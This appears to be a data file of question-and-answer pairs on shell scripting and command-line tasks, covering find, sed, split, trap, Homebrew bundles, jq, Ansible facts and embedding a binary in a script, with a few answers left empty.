    "How to freeze brew requirements like pip?": "Use Homebrew-bundle; it\u2019s designed for that.\n# generate a Brewfile\n$ brew bundle dump\n$ ls\nBrewfile\n\n# check everything is installed\n$ brew bundle check\nThe Brewfile's dependencies are satisfied.\nIt works with both local formulae files and a global one for the current user. It allows you to install everything specified in a Brewfile (that\u2019s the default you can use whatever name you like) as well as uninstall what\u2019s installed but not listed in the file. The file not only list installed formulae but also installed taps (e.g. homebrew/versions, homebrew/php, etc) and casks (if you use Homebrew Cask).",
    "How to see the loaded kernel modules on Mac OSX?": "As documented here: https://developer.apple.com/library/mac/documentation/Porting/Conceptual/PortingUnix/compiling/compiling.html\n\"lsmod is not available on Mac OS X, but other commands exist that offer similar functionality.\" They list kextutil, kextstat, kextload, kmodunload (I think they mean kextunload). These commands have man pages on Mac OS X.",
    "Run a shell command when a file is added": "I don't know how people are uploading content to this folder, but you might want to use something lower-tech than monitoring the directory with inotify.\nIf the protocol is FTP and you have access to your FTP server's log, I suggest tailing that log to watch for successful uploads. This sort of event-triggered approach will be faster, more reliable, and less load than a polling approach with traditional cron, and more portable and easier to debug than something using inotify.\nThe way you handle this will of course depend on your FTP server. I have one running vsftpd whose logs include lines like this:\nFri May 25 07:36:02 2012 [pid 94378] [joe] OK LOGIN: Client \"10.8.7.16\"\nFri May 25 07:36:12 2012 [pid 94380] [joe] OK UPLOAD: Client \"10.8.7.16\", \"/path/to/file.zip\", 8395136 bytes, 845.75Kbyte/sec\nFri May 25 07:36:12 2012 [pid 94380] [joe] OK CHMOD: Client \"10.8.7.16\", \"/path/to/file.zip 644\"\nThe UPLOAD line only gets added when vsftpd has successfully saved the file. You could parse this in a shell script like this:\n#!/bin/sh\n\ntail -F /var/log/vsftpd.log | while read line; do\n  if echo \"$line\" | grep -q 'OK UPLOAD:'; then\n    filename=$(echo \"$line\" | cut -d, -f2)\n    if [ -s \"$filename\" ]; then\n      # do something with $filename\n    fi\n  fi\ndone\nIf you're using an HTTP upload tool, see if that tool has a text log file it uses to record incoming files. If it doesn't consider adding some sort of logger function to it, so it'll produce logs that you can tail.",
    "Shell command to split large file into 10 smaller files": "Use split - e.g. to split a file every 3.4 million lines (should give you 10 files):\nsplit -l 3400000\n$ man split",
    "How to execute a file without .sh extension in shell": "If the file is already executable as abc.sh, then all you need to do is rename the file:\nmv abc.sh abc\n(assuming you are in the directory where the file lives)\nIn a Linux or Unix shell, the file extension doesn't affect whether it will execute or not.",
    "How to remove files using find and rm command?": "You need space between the command and \\;\nfind -mmin -19 -exec rm {} \\;\nfind already provide -delete option, so you don't need to use -exec rm ..:\nfind -mmin -19 -delete\n-delete\nDelete files; true if removal succeeded. If the removal failed, an error message is issued. If -delete fails, find's exit status will be nonzero (when it eventually exits). Use of -delete automatically turns on the -depth option.\nWarnings: Don't forget that the find command line is evaluated as an expression, so putting -delete first will make find try to delete everything below the starting points you specified. When testing a find command line that you later intend to use with -delete, you should explicitly specify -depth in order to avoid later surprises. Because -delete implies -depth, you cannot usefully use -prune and -delete together.",
    "Return Java system exit value to bash script": "If your script has only the two lines then you are not checking for the correct exit code.\nI am guessing you are doing something like:\n$ java YourJavaBinary\n$ ./script \nwhere script contains only:\nSTATUS=\"${?}\"\necho \"${STATUS}\"\nHere, the script is executed in a subshell. So when you execute the script, $? is the value of last command in that shell which is nothing in the subshell. Hence, it always returns 0.\nWhat you probably wanted to do is to call the java binary in your script itself.\njava YourJavaBinary\nSTATUS=\"${?}\"\necho \"${STATUS}\"\nOr simply check the exit code directly without using the script:\n$ java YourJavaBinary ; echo $?",
    "find all files except e.g. *.xml files in shell": "find . ! -name \"*.xml\" -type f",
    "Setting Linux environment variable for another user (sudo)": "You can add VAR=VALUE between the sudo -u xyz and the script. Example\nsudo -u xyz LANG=C LD_LIBRARY_PATH=/usr/local/lib some_script.sh",
    "bash script to extract ALL matches of a regex pattern": "Use grep -o\n-o, --only-matching show only the part of a line matching PATTERN",
    "Shell script Bash, Check if string starts and ends with single quotes": "With a regex:\nif [[ $TEXT =~ ^\\'.*\\'$ ]]\nWith globbing:\nif [[ $TEXT == \\'*\\' ]]",
    "Subprocess in Python: File Name too long": "subprocess.call can take the command to run in two ways - either a single string like you'd type into a shell, or a list of the executable name followed by the arguments.\nYou want the first, but were using the second\nimport subprocess\n\nshellFile = open(\"linksNetCdf.txt\", \"r\")\n\nfor row in shellFile:\n    subprocess.call(row, shell=True)\nBy converting your row into a list containing a single string, you're saying something like \"Run the command named echo these were supposed to be arguments with no arguments\"",
    "download images from google with command line [closed]": "First attempt\nFirst you need to set the user agent so google will authorize output from searches. Then we can look for images and select the desired one. To accomplish that we insert missing newlines, wget will return google searches on one single line, and filter the link. The index of the file is stored in the variable count.\n$ count=10\n$ imagelink=$(wget --user-agent 'Mozilla/5.0' -qO - \"www.google.be/search?q=something\\&tbm=isch\" | sed 's/</\\n</g' | grep '<img' | head -n\"$count\" | tail -n1 | sed 's/.*src=\"\\([^\"]*\\)\".*/\\1/')\n$ wget $imagelink \nThe image will now be in your working directory, you can tweak the last command and specify a desired output file name.\nYou can summarize it in a shell script:\n#! /bin/bash\ncount=${1}\nshift\nquery=\"$@\"\n[ -z $query ] && exit 1  # insufficient arguments\nimagelink=$(wget --user-agent 'Mozilla/5.0' -qO - | \"www.google.be/search?q=${query}\\&tbm=isch\" | sed 's/</\\n</g' | grep '<img' | head -n\"$count\" | tail -n1 | sed 's/.*src=\"\\([^\"]*\\)\".*/\\1/')\nwget -qO google_image $imagelink\nExample usage:\n$ ls\nDocuments\nDownloads\nMusic\nscript.sh\n$ chmod +x script.sh\n$ bash script.sh 5 awesome\n$ ls\nDocuments\nDownloads\ngoogle_image\nMusic\nscript.sh\nNow the google_image should contain the fifth google image when looking for 'awesome'. If you experience any bugs, let me know, I'll take care of them.\nBetter code\nThe problem with this code is that it returns pictures in low resolution. A better solution is as follows:\n#! /bin/bash\n\n# function to create all dirs til file can be made\nfunction mkdirs {\n    file=\"$1\"\n    dir=\"/\"\n\n    # convert to full path\n    if [ \"${file##/*}\" ]; then\n        file=\"${PWD}/${file}\"\n    fi\n\n    # dir name of following dir\n    next=\"${file#/}\"\n\n    # while not filename\n    while [ \"${next//[^\\/]/}\" ]; do\n        # create dir if doesn't exist\n        [ -d \"${dir}\" ] || mkdir \"${dir}\"\n        dir=\"${dir}/${next%%/*}\"\n        next=\"${next#*/}\"\n    done\n\n    # last directory to make\n    [ -d \"${dir}\" ] || mkdir \"${dir}\"\n}\n\n# get optional 'o' flag, this will open the image after download\ngetopts 'o' option\n[[ $option = 'o' ]] && shift\n\n# parse arguments\ncount=${1}\nshift\nquery=\"$@\"\n[ -z \"$query\" ] && exit 1  # insufficient arguments\n\n# set user agent, customize this by visiting http://whatsmyuseragent.com/\nuseragent='Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0'\n\n# construct google link\nlink=\"www.google.cz/search?q=${query}\\&tbm=isch\"\n\n# fetch link for download\nimagelink=$(wget -e robots=off --user-agent \"$useragent\" -qO - \"$link\" | sed 's/</\\n</g' | grep '<a href.*\\(png\\|jpg\\|jpeg\\)' | sed 's/.*imgurl=\\([^&]*\\)\\&.*/\\1/' | head -n $count | tail -n1)\nimagelink=\"${imagelink%\\%*}\"\n\n# get file extention (.png, .jpg, .jpeg)\next=$(echo $imagelink | sed \"s/.*\\(\\.[^\\.]*\\)$/\\1/\")\n\n# set default save location and file name change this!!\ndir=\"$PWD\"\nfile=\"google image\"\n\n# get optional second argument, which defines the file name or dir\nif [[ $# -eq 2 ]]; then\n    if [ -d \"$2\" ]; then\n        dir=\"$2\"\n    else\n        file=\"${2}\"\n        mkdirs \"${dir}\"\n        dir=\"\"\n    fi\nfi   \n\n# construct image link: add 'echo \"${google_image}\"'\n# after this line for debug output\ngoogle_image=\"${dir}/${file}\"\n\n# construct name, append number if file exists\nif [[ -e \"${google_image}${ext}\" ]] ; then\n    i=0\n    while [[ -e \"${google_image}(${i})${ext}\" ]] ; do\n        ((i++))\n    done\n    google_image=\"${google_image}(${i})${ext}\"\nelse\n    google_image=\"${google_image}${ext}\"\nfi\n\n# get actual picture and store in google_image.$ext\nwget --max-redirect 0 -qO \"${google_image}\" \"${imagelink}\"\n\n# if 'o' flag supplied: open image\n[[ $option = \"o\" ]] && gnome-open \"${google_image}\"\n\n# successful execution, exit code 0\nexit 0\nThe comments should be self explanatory, if you have any questions about the code (such as the long pipeline) I'll be happy to clarify the mechanics. Note that I had to set a more detailed user agent on the wget, it may happen that you need to set a different user agent but I don't think it'll be a problem. If you do have a problem, visit http://whatsmyuseragent.com/ and supply the output in the useragent variable.\nWhen you wish to open the image instead of only downloading, use the -o flag, example below. If you wish to extend the script and also include a custom output file name, just let me know and I'll add it for you.\nExample usage:\n$ chmod +x getimg.sh\n$ ./getimg.sh 1 dog\n$ gnome-open google_image.jpg\n$ ./getimg.sh -o 10 donkey",
    "shell script - is there any way converting number to char? [duplicate]": "#!/bin/bash\n# chr() - converts decimal value to its ASCII character representation\n# ord() - converts ASCII character to its decimal value\n\nchr() {\n  printf \\\\$(printf '%03o' $1)\n}\n\nord() {\n  printf '%d' \"'$1\"\n}\n\nord A\necho\nchr 65\necho\nEdit:\nAs you see ord() is a little tricky -- putting a single quote in front of an integer.\nThe Single Unix Specification: \"If the leading character is a single-quote or double-quote, the value shall be the numeric value in the underlying codeset of the character following the single-quote or double-quote.\"\n(Taken from http://mywiki.wooledge.org/BashFAQ/071).\nSee man printf(1p).",
    "Reading quoted/escaped arguments correctly from a string": "A Few Introductory Words\nIf at all possible, don't use shell-quoted strings as an input format.\nIt's hard to parse consistently: Different shells have different extensions, and different non-shell implementations implement different subsets (see the deltas between shlex and xargs below).\nIt's hard to programmatically generate. ksh and bash have printf '%q', which will generate a shell-quoted string with contents of an arbitrary variable, but no equivalent exists to this in the POSIX sh standard.\nIt's easy to parse badly. Many folks consuming this format use eval, which has substantial security concerns.\nNUL-delimited streams are a far better practice, as they can accurately represent any possible shell array or argument list with no ambiguity whatsoever.\nxargs, with bashisms\nIf you're getting your argument list from a human-generated input source using shell quoting, you might consider using xargs to parse it. Consider:\narray=( )\nwhile IFS= read -r -d ''; do\n  array+=( \"$REPLY\" )\ndone < <(xargs printf '%s\\0' <<<\"$ARGS\")\n\nswap \"${array[@]}\"\n...will put the parsed content of $ARGS into the array array. If you wanted to read from a file instead, substitute <filename for <<<\"$ARGS\".\nxargs, POSIX-compliant\nIf you're trying to write code compliant with POSIX sh, this gets trickier. (I'm going to assume file input here for reduced complexity):\n# This does not work with entries containing literal newlines; you need bash for that.\nrun_with_args() {\n  while IFS= read -r entry; do\n    set -- \"$@\" \"$entry\"\n  done\n  \"$@\"\n}\nxargs printf '%s\\n' <argfile | run_with_args ./swap\nThese approaches are safer than running xargs ./swap <argfile inasmuch as it will throw an error if there are more or longer arguments than can be accommodated, rather than running excess arguments as separate commands.\nPython shlex -- rather than xargs -- with bashisms\nIf you need more accurate POSIX sh parsing than xargs implements, consider using the Python shlex module instead:\nshlex_split() {\n  python -c '\nimport shlex, sys\nfor item in shlex.split(sys.stdin.read()):\n    sys.stdout.write(item + \"\\0\")\n'\n}\nwhile IFS= read -r -d ''; do\n  array+=( \"$REPLY\" )\ndone < <(shlex_split <<<\"$ARGS\")",
    "shell - cat - merge files content into one big file": "The problem is that you put bigfile in the same directory, hence making it part of *. So something like\ncat dir/* > bigfile\nshould just work as you want it, with your fileN.txt files located in dir/",
    "Bash - How to call a function declared in a parent shell?": "Try\n$ export -f myfunc\nin the parent shell, to export the function.",
    "Shell script to generate random hex numbers": " echo \"#$(openssl rand -hex 3)\"\nIt has the benefit of being secure random.",
    "bash loop through all find recursively in sub-directories": "FILES=$(find public_html -type f -name '*.php')\nIMPORTANT: Note the single quotes around the *.php to prevent shell expansion of the *.",
    "Multiple commands through JSch shell": "",
    "Best way to modify a file when using pipes?": "You're looking for sponge.",
    "How to execute code in the Django shell by an external python script?": "Firstly, you should not be accessing your Python shell with sudo. There's no need to be running as root.\nSecondly, the way to create a script that runs from the command prompt is to write a custom manage.py script, so you can run ./manage.py deactivate_users. Full instructions for doing that are in the documentation.",
    "How can we get list of non-system users on linux?": "You need to get all users whose gid is greater than or equals 1000. Use this command for that:\nawk -F: '($3>=1000)&&($1!=\"nobody\"){print $1}' /etc/passwd\nIf you want system users (gid<1000) it will be:\nawk -F: '($3<1000){print $1}' /etc/passwd",
    "Until user input equals something do": "This while loop should work:\nwhile [[ -z \"$NEWPASS\" ]]\ndo\n  read -s -p \"Enter new password: \" NEWPASS\ndone",
    "Bash: sort csv file by first 4 columns": "Try:\nsort -t\\; -k 1,1n -k 2,2n -k 3,3n -k 4,4n test.txt\neg:\n1;2;100;4\n1;2;3;4\n10;1;2;3\n9;1;2;3\n\n> sort -t\\; -k 1,1n -k 2,2n -k 3,3n -k 4,4n temp3\n1;2;3;4\n1;2;100;4\n9;1;2;3\n10;1;2;3",
    "How to read using \"read\" from file descriptor 3 in bash script?": "try\nread key <&3",
    "Creating and running a Go build for Mac only": "Since your binary will target OS X, you need to set GOOS to darwin, so your command will be:\nenv GOOS=darwin GOARCH=amd64 go build\nDocumentation on compiler environment variables is in Optional environment variables.\nTo run the binary on Mac, you need to make sure that binary is executable:\nchmod +x path-to-binary\nAnd then run it in Terminal:\npath-to-binary",
    "Zsh tab-completion not working": "Just had to autoload and run compinit.\nHere's the new .zshrc:\nautoload -U compinit promptinit\n\npromptinit\nprompt pure\n\ncompinit\nzstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' 'r:|=*' 'l:|=* r:|=*'\nfpath=(/usr/local/share/zsh-completions $fpath)\n\nsource /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh",
    "Changing all file's extensions in a folder using CLI in Linux": "Use rename:\nrename 's/.old$/.new/' *.old",
    "Syntax error: redirection unexpected [duplicate]": "This answer solves your problem, assuming that your script snippet is complete.\nIn brief, you are running your script through dash, not bash. The solution is as simple as adding the necessary #!/bin/bash\nWhat a system runs by default if the #! is missing varies from system to system. On my system, I don't get your error because a shell that understands your redirections is run by default. I've had to simulate the case where dash would be the default shell to reproduce your error.",
    "Shell script printing contents of variable containing output of a command removes newline characters [duplicate]": "If you want to preserve the newlines, enclose the variable in double quotes:\necho \"$stuff\"\nWhen you write it without the double quotes, the shell expands $stuff into a space-separated list of words (where 'words' are sequences of non-space characters, and the space characters are blanks and tabs and newlines; upon experimentation, it seems that form feeds, carriage returns and back-spaces are not counted as space).\nDemonstrating interpretation of control characters as white space. ASCII 8 is backspace, 9 is tab, 10 is new line (LF), 11 is vertical tab, 12 is form feed, 13 is carriage return. The first command generates a sequence of characters separated by the various control characters. The second command echoes with the result with the original characters preserved - see the hex dump. The third command echoes the result with the shell splitting the words; you can see that the tab and newline were replaced by blank (0x20).\n$ x=$(./ascii 64 65 8 66 67 9 68 69 10 70 71 11 72 73 12 74 75 13 76 77)\n$ echo \"$x\" | odx\n0x0000: 40 41 08 42 43 09 44 45 0A 46 47 0B 48 49 0C 4A   @A.BC.DE.FG.HI.J\n0x0010: 4B 0D 4C 4D 0A                                    K.LM.\n0x0015:\n$ echo  $x  | odx\n0x0000: 40 41 08 42 43 20 44 45 20 46 47 0B 48 49 0C 4A   @A.BC DE FG.HI.J\n0x0010: 4B 0D 4C 4D 0A                                    K.LM.\n0x0015:\n$ ",
    "Reverse text file in Bash": "Try the combined form of tac and rev commands,\n$ tac file | rev\nrelur\nlicnep\nkoob\nFrom man tac\ntac - concatenate and print files in reverse\nFrom man rev\nThe rev utility copies the specified files to standard output, reversing the order of characters in every line. If no files are specified, stan\u2010 dard input is read.",
    "Measure the shell script execution time in milliseconds on Mac OS": "You could use the benchmarking-tool hyperfine (https://github.com/sharkdp/hyperfine).\nIt is more elaborate than time, by default runs your command multiple times and gives you mean runtime, deviation, min, and max.\nSimple usage\nhyperfine your_command\nResult looks like this (result of hyperfine 'sleep 0.5'):\nbash-3.2$ hyperfine 'sleep 0.5'\nBenchmark #1: sleep 0.5\n  Time (mean \u00b1 \u03c3):     505.6 ms \u00b1   1.5 ms    [User: 0.8 ms, System: 1.2 ms]\n  Range (min \u2026 max):   503.1 ms \u2026 508.8 ms    10 runs\nThere is one caveat, the minimum number of runs is 2 (hyperfine -r 2 'your command').\nInstallation\nHyperfine can be installed via Homebrew:\nbrew install hyperfine\nFor more info see: https://github.com/sharkdp/hyperfine#on-macos",
    "How to fire a command when a shell script is interrupted?": "Although it may come as a shock to many, you can use the bash built-in trap to trap signals :-)\nWell, at least those that can be trapped, but CTRL-C is usually tied to the INT signal (it can be changed with stty but let's discount that possibility for simplicity).\nYou can therefore trap the signals and execute arbitrary code. For example, the following script will ask you to enter some text then echo it back to you. If perchance, you generate an INT signal, it simply growls at you and exits:\n#!/bin/bash\n\nexitfn () {\n  trap SIGINT            # Restore signal handling for SIGINT.\n  echo; echo 'Aarghh!!'  # Growl at user,\n  exit                   #   then exit script.\n}\n\ntrap \"exitfn\" INT        # Set SIGINT trap to call function.\n\nread -p \"What? \"         # Ask user for input,\necho \"You said: $REPLY\"  #   then echo back.\n\ntrap SIGINT              # Restore signal handling.\nA test run transcript follows (a fully entered line, a line with pressing CTRL-C before any entry, and a line with partial entry before pressing CTRL-C):\npax> ./testprog.sh \nWhat? hello there\nYou said: hello there\n\npax> ./testprog.sh \nWhat? ^C\nAarghh!!\n\npax> ./qq.sh\nWhat? incomplete line being entere... ^C\nAarghh!!",
    "Using netcat/cat in a background shell script (How to avoid Stopped (tty input)? )": "you probably want netcat's \"-d\" option, which tells it not to read from STDIN.",
    "grep a pattern and output non-matching part of line": "You could use sed:\n$ sed -n \"/$PAT/s/$PAT//p\" $file\nThe only problem is that it'll return an exit code of 0 as long as the pattern is good, even if the pattern can't be found.\nExplanation\nThe -n parameter tells sed not to print out any lines. Sed's default is to print out all lines of the file. Let's look at each part of the sed program in between the slashes. Assume the program is /1/2/3/4/5:\n/$PAT/: This says to look for all lines that matches pattern $PAT to run your substitution command. Otherwise, sed would operate on all lines, even if there is no substitution.\n/s/: This says you will be doing a substitution\n/$PAT/: This is the pattern you will be substituting. It's $PAT. So, you're searching for lines that contain $PAT and then you're going to substitute the pattern for something.\n//: This is what you're substituting for $PAT. It is null. Therefore, you're deleting $PAT from the line.\n/p: This final p says to print out the line.\nThus:\nYou tell sed not to print out the lines of the file as it processes them.\nYou're searching for all lines that contain $PAT.\nOn these lines, you're using the s command (substitution) to remove the pattern.\nYou're printing out the line once the pattern is removed from the line.",
    "How do I determine if a shell script is running with root permissions?": "bash/sh:\n#!/usr/bin/env bash\n# (Use #!/bin/sh for sh)\nif [ `id -u` = 0 ] ; then\n        echo \"I AM ROOT, HEAR ME ROAR\"\nfi\ncsh:\n#!/bin/csh\nif ( `id -u` == \"0\" ) then\n        echo \"I AM ROOT, HEAR ME ROAR\"\nendif",
    "Walking a process tree": "Just wanted to document my steps related to this problem.\nSay I execute this in a terminal:\n~$ echo \"read -p 'Press Enter'\" > mytest.sh\n~$ chmod +x mytest.sh\n~$ bash -c bash\n~$ bash -c ./mytest.sh\n... and leave it waiting at the read input prompt. Then, I can always find the pid of mytest.sh like:\n$ ps axf | grep mytest\n20473 pts/2    S+     0:00              |   |   \\_ grep --color=tty mytest\n20308 pts/5    S+     0:00              |   |       \\_ bash -c ./mytest.sh\n... however, I'd like to output a ps axf tree limited to some parent of mytest.sh; looking at a full ps axf, we can see a hierarchy:\n$ ps axf\n\n 1489 ?        Sl     1:39              \\_ gnome-terminal --sm-client-id 106ab86\n 1511 ?        S      0:00              |   \\_ gnome-pty-helper\n...\n20238 pts/5    Ss     0:00              |   \\_ bash\n20274 pts/5    S      0:00              |   |   \\_ bash\n20308 pts/5    S+     0:00              |   |       \\_ bash -c ./mytest.sh\n...\nThen, say I don't want to 'scan' the gnome-terminal (1489) as parent, but instead I want to start at bash (20238).. So, I'd like to obtain this output:\n$ ps f -p 20238 20274 20308\n  PID TTY      STAT   TIME COMMAND\n20238 pts/5    Ss     0:00 bash\n20274 pts/5    S      0:00  \\_ bash\n20308 pts/5    S+     0:00      \\_ bash -c ./mytest.sh\n... except, I don't want to copy/paste the child PIDs manually :)\nI could use pstree:\n$ pstree -a -p 20238\nbash,20238\n  \u2514\u2500bash,20274\n      \u2514\u2500bash,20308 -c ./mytest.sh\n\n$ pstree -p 20238\nbash(20238)\u2500\u2500\u2500bash(20274)\u2500\u2500\u2500bash(20308)\n... unfortunately, the output is not exactly the same as in ps axf, which I prefer.\nSo, I can use pstree simply to obtain child PIDs:\n$ pstree -p 20238 | sed 's/(/\\n(/g' | grep '(' | sed 's/(\\(.*\\)).*/\\1/'\n20238\n20274\n20308\n\n$ pstree -p 20238 | sed 's/(/\\n(/g' | grep '(' | sed 's/(\\(.*\\)).*/\\1/' | tr \"\\n\" ,\n20238,20274,20308,\nand then use those to obtain a ps axf tree, based only on the PID of the parent:\n$ ps f -p $(pstree -p 20238 | sed 's/(/\\n(/g' | grep '(' | sed 's/(\\(.*\\)).*/\\1/' | tr \"\\n\" \" \")\n  PID TTY      STAT   TIME COMMAND\n20238 pts/5    Ss     0:00 bash\n20274 pts/5    S      0:00  \\_ bash\n20308 pts/5    S+     0:00      \\_ bash -c ./mytest.sh\nWell, hope this helps someone,\nCheers!",
    "Subtracting two timestamps in bash script": "If you want to process the date using simple command line tools, you need to convert the timestamps into some easy-to-deal-with format, like epoch-based.\nYou can do this with the date command, which you can wrap in a function like so:\ntimestamp() { \n    date '+%s%N' --date=\"$1\"\n}\n# timestamp '2020-01-01 12:20:45.12345' => 1577899245123450000\nThen you can subtract them directly:\necho $(( $(timestamp \"$etime\") - $(timestamp \"$stime\") ))\nNote that the %N format specifier (nanoseconds) is a GNU extension and is not handled in the default macOS date command. Either (a) brew install coreutils and use gdate in the function above or (b) use this alternative function on macOS (but note it lacks support for sub-second measurements):\ntimestamp() {\n    local format='%Y-%m-%d %H:%M:%S'     # set to whatever format is used\n    date -j -f \"$format\" \"$1\" '+%s'\n}\n# timestamp '2020-01-01 12:20:45' => 1577899245",
    "linux use watch command with multiple calls": "watch by default runs the passed command in shell so you can pass it any command valid for shell:\nwatch 'ls dir1; ls dir2'",
    "How to read and parse the json file and add it into the shell script variable?": "Replace this,\ndatabasename=`cat loaded.json | json select '.name'`\nor try jq command,\ndatabasename=`jq '.name' loaded.json`\nFor more information read this article.",
    "Ansible IP address variable - host part": "As mentioned by jarv this can be obtained by using facts.\nThis can be done in the following ways:\nFor a list of all ipv4 addresses:\n{{ ansible_all_ipv4_addresses }}\nFor the default ipv4 address:\n{{ ansible_default_ipv4.address }}\nIf you know the ip address is on the eth0 interface:\n{{ ansible_eth0.ipv4.address }} \nYou can then append the .split('.')[3] method to the variable to get the appropriate output, for example {{ ansible_default_ipv4.address.split('.')[3] }}",
    "Shell programming: How to use find in fish?": "Thanks to Carl.\n{ and } have special meanings in fish. They need to be escaped in order to work with find, for example:\nfind . -exec echo \\{\\} \\;",
    "Bourne shell: send arguments $2 to $N to variadic function?": "I think you could achieve this effect using the shift command. It will move all of the positional parameters down one place and drops the value of $1 (so the value of $3 gets moved to $2, the value of $2 gets moved to $1 and the value of $1 is lost). Once you've done that you can just use $@ to pick up the list of arguments you're actually interested in e.g.\nfunction build() {\n    echo \"build with $@\"\n}\n\necho \"Starting args are $@\"\ncmd=$1\nshift\n\nif [ \"$cmd\" = 'build' ]; then\n    build \"$@\"\nfi",
    "running r scripts or commands with interpretor in unix for unix-layman": "",
    "inotifywait - exclude regex pattern formatting": "I've tried the (?!) thing\nThis thing is called negative lookahead and it is not supported by POSIX ERE.\nSo you have to do it the hard way, i.e. match everything that you want to exclude.\ne.g.\n\\.(txt|xml) etc.",
    "My shell script stops after exec": "exec replaces the shell process. Remove it if you only want to call the command as a subprocess instead.",
    "Splitting bulk text file every n line": "for f in filename*.txt; do split -d -a1 -l10000 --additional-suffix=.txt \"$f\" \"${f%.txt}-\"; done\nOr, written over multiple lines:\nfor f in filename*.txt\ndo\n    split -d -a1 -l10000 --additional-suffix=.txt \"$f\" \"${f%.txt}-\"\ndone\nHow it works:\n-d tells split to use numeric suffixes\n-a1 tells split to start with only single digits for the suffix.\n-l10000 tells split to split every 10,000 lines.\n--additional-suffix=.txt tells split to add .txt to the end of the names of the new files.\n\"$f\" tells split the name of the file to split.\n\"${f%.txt}-\" tells split the prefix name to use for the split files.\nExample\nSuppose that we start with these files:\n$ ls\nfilename1.txt  filename2.txt\nThen we run our command:\n$ for f in filename*.txt; do split -d -a1 -l10000 --additional-suffix=.txt \"$f\" \"${f%.txt}-\"; done\nWhen this is done, we now have the original files and the new split files:\n$ ls\nfilename1-0.txt  filename1-1.txt  filename1.txt  filename2-0.txt  filename2-1.txt  filename2.txt\nUsing older, less featureful forms of split\nIf your split does not offer --additional-suffix, then consider:\nfor f in filename*.txt\ndo \n    split -d -a1 -l10000 \"$f\" \"${f%.txt}-\"\n    for g in \"${f%.txt}-\"*\n    do \n        mv \"$g\" \"$g.txt\"\n    done\ndone",
    "Hide error message in bash": "Is the error message coming from the head program (like, file not found)?\nIn this case you have to redirect the output from inside parens:\nfirs_line=$(head -n 1 file 2>/dev/null)\nMoreover, you only have to redirect standard error (and not standard output which is supposed to be catched by $() to be stored in firs_line",
    "Removing files interactively with find and xargs": "You can do this by using exec option with find. Use the command\nfind . -name '#*#' -exec rm -i {} \\;\nxargs will not work (unless you use options such as -o or -p) because it uses stdin to build commands. Since stdin is already in use, you cannot input the response for query with rm.",
    "Embed a Executable Binary in a shell script": "Yes, this can be done. It's actually quite similar in concept to your linked article. The trick is to use uuencode to encode the binary into text format then tack it on to the end of your script.\nYour script is then written in such a way that it runs uudecode on itself to create a binary file, change the permissions then execute it.\nuuencode and uudecode were originally created for shifting binary content around on the precursor to the internet, which didn't handles binary information that well. The conversion into text means that it can be shipped as a shell script as well. If, for some reason your distribution complains when you try to run uuencode, it probably means you have to install it. For example, on Debian Squeeze:\nsudo aptitude install sharutils\nwill get the relevant executables for you. Here's the process I went through. First create and compile your C program hello.c:\npax> cat hello.c\n\n#include <stdio.h>\nint main (void) {\n    printf (\"Hello\\n\");\n    return 0;\n}\n\npax> gcc -o hello hello.c\nThen create a shell script testEmbed.sh, which will decode itself:\npax> cat testEmbed.sh\n\n#!/bin/bash\nrm -f hello\nuudecode $0\n./hello\nrm -f hello\nexit\nThe first rm statement demonstrates that the hello executable is being created anew by this script, not left hanging around from your compilation. Since you need the payload in the file as well, attach the encoded executable to the end of it:\npax> uuencode hello hello >>testEmbed.sh\nAfterwards, when you execute the script testEmbed.sh, it extracts the executable and runs it.\nThe reason this works is because uudecode looks for certain marker lines in its input (begin and end) which are put there by uuencode, so it only tries to decode the encoded program, not the entire script:\npax> cat testEmbed.sh\n\n#!/bin/bash\nrm -f hello\nuudecode $0\n./hello\nrm -f hello\nexit\n\nbegin 755 hello\nM?T5,1@$!`0````````````(``P`!````$(,$\"#0```#`!@```````#0`(``'\nM`\"@`'@`;``8````T````-(`$\"#2`!`C@````X`````4````$`````P```!0!\n: : :\nM:&%N9&QE`%]?1%1/4E]%3D1?7P!?7VQI8F-?8W-U7VEN:70`7U]B<W-?<W1A\nM<G0`7V5N9`!P=71S0$!'3$E\"0U\\R+C``7V5D871A`%]?:38X-BYG971?<&-?\n4=&AU;FLN8G@`;6%I;@!?:6YI=```\n`\nend\nThere are other things you should probably worry about, such as the possibility that your program may require shared libraries that don't exist on the target system, but the process above is basically what you need.\nThe process for a JAR file is very similar, except that the way you run it is different. It's still a single file but you need to replace the line:\n./hello\nwith something capable of running JAR files, such as:\njava -jar hello.jar",
    "Copy/Paste part of a file into another file using Terminal (or Shell)": "if you know how many lines are in your source file (wc -l) you can do this .. assume 12000 lines and you want lines 2000 - 7000 in your new file (total of 5000 lines).\ncat myfile | tail -10000 | head -5000 > newfile\nRead the last 10k lines, then read the 1st 5k lines from that.",
    "Determine whether process output is being redirected in C/C++": "You can use isatty on linux. This function is obviously not standard C, since - for example - on many platforms you can't redirect the output to a file.",
    "oh-my-zsh: git maximum nested function level reached": "My mistake, I moved bash function to zsh:\ngr() {\n  git rebase -i HEAD~$1\n}\nSolution:\nfunction gr() {\n  git rebase -i HEAD~$1\n}",
    "How can I delete all files starting with ._ from the shell in Linux?": "Try something like:\ncd /path/to/directory; \\rm -rf ._*\nOR if there are recursive files with in subfolders then try:\nfind /path/to/directory -name \"._*\" -type f -print0| xargs -0 \\rm -rf",
    "How to make one line for loop in android shell": "",
    "Base 64 encoding from command line gives different output than other methods": "echo outputs the string and a newline at the end. If you want just the string you provided, use echo -n",
    "Capitalize the first letter of every word in a filename or directory in Shell": "Using GNU Sed\nYou can do this quite easily with GNU sed. For example:\n$ echo '/doCumenTS/tesT.txt' | sed 's!/.!\\U&!g'\n/DoCumenTS/TesT.txt\nLimitations\nNote that the \\U escape is a GNU sed extension. The manual says:\nFinally, as a GNU 'sed' extension, you can include a special sequence made of a backslash and one of the letters 'L', 'l', 'U', 'u', or 'E'.\n`\\U'\n     Turn the replacement to uppercase until a `\\L' or `\\E' is found",
